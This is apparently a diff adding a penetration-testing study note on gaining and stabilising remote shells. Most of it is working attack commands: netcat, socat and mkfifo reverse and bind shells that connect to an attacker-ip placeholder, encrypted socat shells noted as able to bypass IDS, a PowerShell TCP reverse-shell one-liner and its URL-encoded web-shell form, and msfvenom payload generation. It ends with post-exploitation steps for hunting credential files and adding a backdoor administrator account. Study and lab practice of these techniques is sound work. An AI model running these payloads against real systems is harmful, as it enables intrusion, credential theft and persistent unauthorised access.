@@ -1,0 +1,143 @@
+- Command line access to the server (reverse shell).
+- Open a port on the server which we can connect to in order to execute further commands (bind shell).
+- ## Types
+	- #### *Reverse Shells*
+		- Target forced to execute code that connects back to our computer.
+		- A good way to bypass firewall rules that may prevent us from connecting to arbitrary ports on the target.
+		- When receiving a shell from a machine across the internet, we would need to configure our own network to accept the shell.
+	- #### Bind Shells
+		- Code executed on the target is used to start a listener attached to a shell directly on the target.
+		- This would then be opened to the internet, meaning we could connect to the port that the code has opened and obtain RCE that way.
+		- Has the advantage of not requiring any configuration on our own network, but may be prevented by firewalls.
+- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- ## Tools
+	- #### Netcat
+		- Used to perform
+			- Banner grabbing during enumeration.
+			- Receive reverse shells.
+			- Connect to remote ports to bind shells on a target system.
+		- Very unstable, but can be improved by techniques.
+		- **Reverse Shell**
+			- On the attacker `sudo nc -lvnp <port>`
+			- On the target `nc <attacker-ip> <port> -e /bin/bash`
+		- **Bind Shell**
+			- On the target `nc -lvnp <port> -e "cmd.exe"`
+			- On the attacker `nc <target-ip> <port>`
+		- **Stabilization**
+			- Using Python
+				- `python -c 'import pty;pty.spawn("/bin/bash")'` spawns a better featured bash shell.
+				- `export TERM=xterm` gives us access to term commands like `clear`.
+				- Background the shell using `CTRL+Z` then on our machine use `stty raw -echo; fg`
+					- First it turns off our own terminal echo (which gives us access to autocompletes, arrow keys, and `CTRL+C` to kill processes).
+					- Then foregrounds the shell.
+			- Using rlwrap
+				- A program that gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
+				- However, some manual stabilization must still be utilized to use `CTRL+C`.
+				- `rlwrap nc -lvnp <port>`
+				- Background the shell using `CTRL+Z` then on our machine use `stty raw -echo; fg` to completely stabilize the shell.
+			- Using Socat
+				- Use an initial netcat shell as a stepping stone into a more fully-fledged socat shell.
+				- Limited to Linux targets.
+				- Transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target.
+				- Change the terminal tty size using
+						- On the attacking machine use `stty -a` to get the rows and columns values.
+						- On the reverse/bind shell `stty rows <rows>` `stty cols <columns>`
+	- #### Socat
+		- Netcat on steroids.
+		- Can do the same thing as Netcat, and more, but more stable.
+		- A connector between two points; a listening port and a keyboard, a listening port and a file, or two listening ports.
+		- **Reverse Shells**
+			- On the attacker `socat TCP-L:<port -`
+			- On the target
+				- Windows `socat TCP:<attacker-ip>:<port> EXEC:powershell.exe,pipes`
+				- Linux `socat TCP:<attacker-ip>:<port> EXEC:"bash -li"`.
+		- **Bind Shells**
+			- On the target
+				- Windows `socat TCP-L:<port> EXEC:powershell.exe,pipes` pipes interfaces between the Unix and Windows ways of handling input and output in a CLI environment.
+				- Linux `socat TCP-L:<port> EXEC:"bash -li"`
+			- On the attacker `socat TCP:<target-ip>:<target-port> -`
+		- A fully stable Linux tty reverse shell
+			- The listener ```socat TCP-L:<port> FILE:`tty`,raw,echo=0```
+			- In case socat isn't on the target, Use [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true).
+			- Activate the listener with `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+				- `pty` allocates a pseudoterminal on the target.
+				- `stderr` makes sure that any error messages get shown in the shell.
+				- `sigint` passes any Ctrl + C commands through into the sub-process
+				- `setsid` creates the process in a new session.
+				- `sane` stabilizes the terminal, attempting to "normalize" it.
+		- For debugging add `-d -d`.
+		- **Encrypted Shells**
+			- Able to bypass IDS.
+			- Generate a certificate to use encrypted shells `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`.
+			- Merge the two created files into a single `.pem` file `cat shell.key shell.crt > shell.pem`.
+			- Copy the `.pem` file to the target.
+			- For reverse shells
+				- Set up a reverse shell using `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`.
+					- Sets up a listener.
+					- `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized authority.
+				- To connect back use `socat OPENSSL:<attacker-ip>:<attecker-port>,verify=0 EXEC:/bin/bash`.
+			- For bind shells
+				- On target `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`.
+				- On attacker `socat OPENSSL:<target-ip>:<target-port>,verify=0 -`.
+		- A fully stable Linux tty reverse shell
+			- Listener ```socat OPENSSL-LISTENER:<port>,cert=shell.pem,verify=0 file:`tty`,raw,echo=0```.
+			- Connect using `socat OPENSSL:<attacker-ip>:<attacker-port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.
+	- #### Common Shell Payloads
+		- In some versions of netcat, there is an option `-e` which allows us to execute a process on connection `nc -lvnp <port> -e /bin/bash`.
+		- Connecting to the above listener with netcat would result in a bind shell on the target.
+		- For a reverse shell, connecting back with `nc <attacker-ip> <attacker-port> -e /bin/bash`.
+		- For Windows, the above works perfectly because we would already have transferred a static binary of netcat which includes the `-e` option, but for Linux, we use this code to create a listener for a bind shell `mkfifo /tmp/f; nc -lvnp <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.
+			- Creates a named pipe at `/tmp/f`
+			- Then starts a netcat listener, and connects the input of the listener to the output of the named pipe.
+			- The output of the listener (the commands we send) then gets piped directly into `sh`, sending the `stderr` output stream into `stdout`, and sending `stdout` itself into the input of the named pipe, thus completing the circle.
+		- The above for reverse shells `mkfifo /tmp/f; nc <attacker-ip> <attacker-port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.
+		- PowerShell one-liner reverse shell 
+			- `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+			- Change the IP and PORT placeholders!
+	- #### Metasploit multi/handler
+		- `exploit/multi/handler` module, used to receive reverse shells.
+		- The only way to interact with a `meterpreter` shell.
+		- The easiest way to handle staged payloads.
+		- 3 options we need to set when using multi/handler
+			- `set payload <payload>`
+			- `set lhost <attacker-ip>`
+			- `set lport <attacker-port>`
+		- The payload should be set according to the type of shell to be used.
+		- Then use `exploit -j` to launch the module, running as a job in the background.
+		- Using `sessions` to list the sessions and `sessions <session-id>` to foreground the session.
+	- #### Msfvenom
+		- Generates payload like reverse shells, bind shells and many more.
+		- `msfvenom -p <payload> <options>`.
+		- `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe lhost=<attacker-ip> lport=<attacker-port>`.
+			- `-f` output format, like `exe, elf, aspx, war, py`.
+		- **Staged**
+			- Payloads are sent in two parts
+				- The first part is called the stager, piece of code executed directly on the target itself. Connects back to a waiting listener, but doesn't actually contain any reverse shell code. Used to load the real payload, executing it directly and preventing it from touching the disk where it could get caught by anti-virus solutions.
+				- The bulkier reverse shell code which is downloaded when the stager is activated. Requires a special listener, usually Metasploit multi/handler.
+		- **Stageless**
+			- Entirely self-contained in one piece of code which when executed sends a shell back immediately to the waiting listener.
+			- The most common reverse shell payload.
+			- Easier to use and catch, and are easier for an anti-virus or IPS program to discover and remove.
+		- **Naming Convention for Payloads**
+			- `<OS>/<arch>/<payload>` for example `linux/x86/shell_reverse_tcp`. With an exception to this convention for Windows 32 bit targets `windows/shell_reverse_tcp`.
+			- Staged payloads are indicated with `/` like `shell/reverse_tcp` and stageless with `_` like `shell_reverse_tcp`.
+			- The above rule also applies to Meterpreter payloads.
+				- A Windows 64 bit staged Meterpreter payload `windows/x64/meterpreter/reverse_tcp`.
+				- A Linux 32 bit stageless Meterpreter payload `linux/x86/meterpreter_reverse_tcp`.
+		- List payloads with `msfvenom --list payloads`.
+	- ### *WebShells*
+		- When we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a web shell.
+		- A script that runs inside a web server (usually in a language such as PHP or ASP) which executes code on the server.
+		- Essentially, commands are entered into a web page, either through a HTML form, or directly as arguments in the URL,  which are then executed by the script, with the results returned and written to the page.
+		- Web shells on Kali are located in `/usr/share/webshells`.
+		- Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux web servers. They will not work on Windows by default.
+		- When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using `msfvenom` to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded PowerShell Reverse Shell. This would be copied into the URL as the `cmd` argument:
+			- `powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`
+			- Change the IP and PORT placeholders!
+- ## *After Getting Shell*
+	- Even after trying to stable the shell, they are still not ideal.
+	- On Linux, look for SSH keys at `/home/<user>/.ssh` or using [Dirty C0w](https://dirtycow.ninja/) or a writable `/etc/shadow` or `/etc/passwd` would quickly give you SSH access to the machine, assuming SSH is open.
+	- On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plain text. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plain text, depending on the version.
+	- Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over `RDP`, `telnet`, `winexe`, `psexec`, `WinRM` or any number of other methods, dependent on the services running on the machine.
+		- `net user <username> <password> /add`
+		- `net localgroup administrators <username> /add`
